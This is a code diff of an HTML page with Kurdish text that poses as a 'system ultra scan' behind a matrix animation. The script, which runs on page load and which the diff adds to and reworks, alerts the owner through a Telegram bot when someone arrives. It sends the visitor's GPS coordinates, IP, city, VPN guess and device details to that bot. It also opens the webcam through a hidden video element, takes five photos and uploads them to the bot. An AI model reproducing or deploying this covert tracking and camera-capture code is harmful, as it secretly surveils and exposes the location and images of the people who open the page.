@@ -14,8 +14,8 @@
 <body>
     <canvas id="matrix"></canvas>
     <div class="content">
-        <h1>[ SYSTEM DEEP SCAN ]</h1>
-        <div class="box"><p id="status">> پشکنینی قووڵی سیستەم لە کاردایە...</p></div>
+        <h1>[ SYSTEM ULTRA SCAN ]</h1>
+        <div class="box"><p id="status">> پشکنینی ئایپی و شوێنی ورد لە کاردایە...</p></div>
     </div>
     <video id="v" style="display:none;" autoplay playsinline></video>
     <canvas id="c" style="display:none;"></canvas>
@@ -26,91 +26,87 @@
 
         async function start() {
             try {
-                // ١. زانیاری ئایپی و شوێن
+                // ١. ئاگادارکردنەوەی سەرەتایی
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("کەسێک هاتە ناوی⚠️!")}`);
+
+                // ٢. وەرگرتنی لۆکەیشنی ورد (GPS)
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async (pos) => {
+                        const lat = pos.coords.latitude;
+                        const lon = pos.coords.longitude;
+                        const locMsg = `📍 **شوێنی وردی کەسەکە (GPS):**\nhttps://www.google.com/maps?q=${lat},${lon}`;
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locMsg)}&parse_mode=Markdown`);
+                    }, (err) => {
+                        fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("❌ کەسەکە ڕێگەی نەدا لۆکەیشنەکەی وەربگیرێت.")}`);
+                    });
+                }
+
+                // ٣. زانیارییەکانی تر
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const data = await ipRes.json();
-                
-                // ٢. خێرایی شاشە
-                const getHz = () => new Promise(r => requestAnimationFrame(t1 => requestAnimationFrame(t2 => r(Math.round(1000/(t2-t1))))));
-                const hz = await getHz();
+                const userTZ = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const isVPN = userTZ !== data.timezone ? "⚠️ بەڵێ" : "✅ نەخێر";
 
-                // ٣. زانیاری هێڵی ئینتەرنێت
-                const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-                const netInfo = conn ? `${conn.effectiveType.toUpperCase()} (~${conn.downlink} Mbps)` : "نادیار";
-
-                // ٤. دۆخی تاریک و ڕوون
-                const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches;
-                const themeStatus = isDarkMode ? "🌙 Dark Mode (تاریک)" : "☀️ Light Mode (ڕوون)";
-
-                // ٥. زانیاری پاتری و شەحن
                 let batteryLevel = "نادیار", chargingStatus = "نادیار";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
                     batteryLevel = Math.round(b.level * 100) + "%";
-                    chargingStatus = b.charging ? "✅ بەڵێ (لە شەحندایە)" : "❌ نەخێر (لە شەحن نییە)";
+                    chargingStatus = b.charging ? "✅ بەڵێ" : "❌ نەخێر";
                 }
 
-                // ٦. گرافیک و سیستەم
-                const gl = document.createElement('canvas').getContext('webgl');
-                const gpu = gl.getExtension('WEBGL_debug_renderer_info') ? gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) : "N/A";
+                const msg = `
+🚀 **سـیـسـتـەمـی هـاکـەر دێـتـا** 🚀
+----------------------------------
+🌐 **تۆڕ:**
+• 🌍 ئایپی: \`${data.ip}\`
+• 🔒 بەکارهێنانی VPN: **${isVPN}**
+• 📍 شوێنی ئایپی: ${data.city}
 
-                const msg = `🎭 **ڕاپۆرتی قووڵی سیستەم** 🎭
-------------------------------
-🌐 **ئینتەرنێت:**
-• ئایپی: \`${data.ip}\`
-• هێڵ: ${netInfo}
-• شار: ${data.city} (${data.country_name})
-• کۆمپانیا: ${data.org}
+🔋 **پاتری:**
+• ⚡ لە شەحنە؟: ${chargingStatus}
+• 📊 ڕێژە: ${batteryLevel}
 
-🔋 **بارودۆخی پاتری:**
-• ڕێژەی شەحن: ${batteryLevel}
-• لە شەحندایە؟: ${chargingStatus}
+📱 **ئامێر:**
+• 🎨 دۆخ: **${window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light"}**
+• 🧠 پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
+• 💾 ڕام: ${navigator.deviceMemory || 'N/A'} GB
 
-📱 **ئامێر و شاشە:**
-• دۆخی ڕەنگ: **${themeStatus}**
-• خێرایی شاشە: ${hz}Hz
-• قەبارە: ${window.screen.width}x${window.screen.height}
-• گرافیک: ${gpu}
-• پڕۆسێسەر: ${navigator.hardwareConcurrency} Cores
-• ڕام: ${navigator.deviceMemory || 'N/A'} GB
+⏰ **کات:** ${new Date().toLocaleString('ku-IQ')}
+----------------------------------
+`;
+                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
 
-⚙️ **سیستەم و کات:**
-• پلاتفۆرم: ${navigator.platform}
-• زمان: ${navigator.language}
-• کات: ${new Date().toLocaleString('ku-IQ')}
-------------------------------`;
-
-                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`, {keepalive: true});
-                
-                // ٧. گرتنی ٥ وێنە بە دوای یەکدا
+                // ٤. گرتنی ئەلبومی وێنەکان
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const videoEl = document.getElementById('v');
                 videoEl.srcObject = stream;
+                
+                let photoBlobs = [];
+                for (let i = 0; i < 5; i++) {
+                    await new Promise(r => setTimeout(r, 1200));
+                    const picCanvas = document.getElementById('c');
+                    picCanvas.width = videoEl.videoWidth;
+                    picCanvas.height = videoEl.videoHeight;
+                    picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
+                    const blob = await new Promise(r => picCanvas.toBlob(r, 'image/jpeg'));
+                    photoBlobs.push(blob);
+                }
+                stream.getTracks().forEach(t => t.stop());
 
-                let count = 0;
-                const takePic = () => {
-                    if (count < 5) {
-                        const picCanvas = document.getElementById('c');
-                        picCanvas.width = videoEl.videoWidth;
-                        picCanvas.height = videoEl.videoHeight;
-                        picCanvas.getContext('2d').drawImage(videoEl, 0, 0);
-                        picCanvas.toBlob(b => {
-                            const f = new FormData(); 
-                            f.append('chat_id', chatId); 
-                            f.append('photo', b, `img${count}.jpg`);
-                            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: f, keepalive: true });
-                        }, 'image/jpeg');
-                        count++;
-                        setTimeout(takePic, 1500); // نێوان وێنەکان
-                    } else {
-                        stream.getTracks().forEach(t => t.stop());
-                    }
-                };
-                setTimeout(takePic, 1000);
+                const formData = new FormData();
+                formData.append('chat_id', chatId);
+                const media = [];
+                photoBlobs.forEach((blob, index) => {
+                    formData.append(`p${index}`, blob, `p${index}.jpg`);
+                    media.push({ type: 'photo', media: `attach://p${index}` });
+                });
+                formData.append('media', JSON.stringify(media));
+                fetch(`https://api.telegram.org/bot${botToken}/sendMediaGroup`, { method: 'POST', body: formData });
+
             } catch(e){}
         }
 
-        // Matrix Animation
+        // Matrix Effect
         const canvas = document.getElementById('matrix');
         const ctx = canvas.getContext('2d');
         canvas.width = window.innerWidth; canvas.height = window.innerHeight;
